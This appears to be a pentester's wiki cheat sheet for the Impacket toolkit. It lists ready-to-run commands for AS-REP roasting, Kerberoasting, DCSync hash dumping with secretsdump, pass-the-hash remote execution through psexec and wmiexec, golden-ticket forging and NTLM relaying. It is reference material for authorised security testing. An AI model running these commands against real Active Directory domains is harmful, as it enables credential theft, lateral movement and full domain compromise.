#tools #active-directory

A collection of Python scripts for working with Windows network protocols (SMB, Kerberos, MS-RPC, LDAP) at a low level. Not one tool — a toolbox. Two scripts carry the AS-REP→DCSync chain (`GetNPUsers.py`, `secretsdump.py`), but the suite does remote exec, relaying, ticket forging and more.

## Install / invoke
Scripts install onto your `PATH` as commands. **Call them by name — not `python3 GetNPUsers.py`**, which looks for a local file and fails with `No such file or directory`. On some distros they're prefixed `impacket-` (e.g. `impacket-secretsdump`).
```bash
which secretsdump.py        # locate if the bare name isn't found
```

## Two rules that bite everyone
1. **`-dc-ip <ip>`** — Impacket resolves the domain by name; if your box doesn't use the DC for DNS, scripts die with `Name or service not known`. Pass the DC IP to skip DNS.
2. **Auth is consistent across every script.** The target is `domain/user:pass@host`, and you can swap the password for other factors:

| Auth style | Syntax |
| --- | --- |
| Password | `domain/user:pass@host` |
| Prompt for password | `domain/user@host` (omit `:pass`) |
| Pass-the-hash | `domain/user@host -hashes LMHASH:NTHASH` (LM can be blank → `:NTHASH`) |
| Kerberos ticket | `domain/user@host -k -no-pass` (uses `$KRB5CCNAME`) |
| AES key (overpass-the-hash) | `-aesKey <key>` |
| No creds (anonymous) | `domain/@host -no-pass` |

---

## Credential-gathering scripts
```bash
# AS-REP roast (no creds needed) — accounts with preauth disabled
GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip <ip>

# Kerberoast (needs any valid cred) — accounts with an SPN
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <ip> -request -outputfile tgs.txt

# DCSync / NTDS dump (needs replication rights)
secretsdump.py <domain>/<user>:<pass>@<ip> -dc-ip <ip> -just-dc
```
- `GetNPUsers` → `$krb5asrep$23$...` → [[Hashcat]] mode **18200**.
- `GetUserSPNs` → `$krb5tgs$23$...` → Hashcat mode **13100**.
- `secretsdump -just-dc` → `user:RID:LM:NT:::` lines. NT hash is the segment **after** the `aad3b435...` empty-LM placeholder. `-just-dc-ntlm` skips the Kerberos keys; drop `-just-dc` entirely to also pull local SAM + LSA secrets (needs local admin).
- secretsdump's registry/VSS method may fail `rpc_s_access_denied`; it falls back to the **DRSUAPI** replication method and dumps anyway.

## Remote execution (once you have creds/hash)
| Script | Mechanism | Shell as | Notes |
| --- | --- | --- | --- |
| `psexec.py` | Service + named pipe | **SYSTEM** | Loud, writes a service; classic |
| `smbexec.py` | Service, semi-interactive | SYSTEM | Lighter than psexec |
| `wmiexec.py` | WMI | the user | Quieter, no service, semi-interactive |
| `atexec.py` | Scheduled task | the user | Runs one command |
| `dcomexec.py` | DCOM | the user | Alternative when others are blocked |
```bash
wmiexec.py <domain>/Administrator@<ip> -hashes :<NThash>
psexec.py  <domain>/Administrator:<pass>@<ip>
```

## Tickets, relaying, enumeration
```bash
getTGT.py <domain>/<user>:<pass>           # request a TGT → .ccache (set KRB5CCNAME)
ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain <d> Administrator   # golden ticket
ntlmrelayx.py -tf targets.txt -smb2support  # relay captured NTLM auth
lookupsid.py <domain>/<user>:<pass>@<ip>    # RID cycling → user list
samrdump.py  <domain>/<user>:<pass>@<ip>    # users/groups via SAMR
GetADUsers.py -all <domain>/<user>:<pass> -dc-ip <ip>   # AD user list via LDAP
findDelegation.py <domain>/<user>:<pass>    # unconstrained/constrained deleg targets
mssqlclient.py <domain>/<user>:<pass>@<ip>  # interact with MSSQL
smbserver.py share /tmp/loot -smb2support   # host a quick SMB share for file transfer
```

Pass-the-Hash to an interactive shell is usually cleaner via [[evil-winrm]]. Part of [[Active Directory Exploitation]].
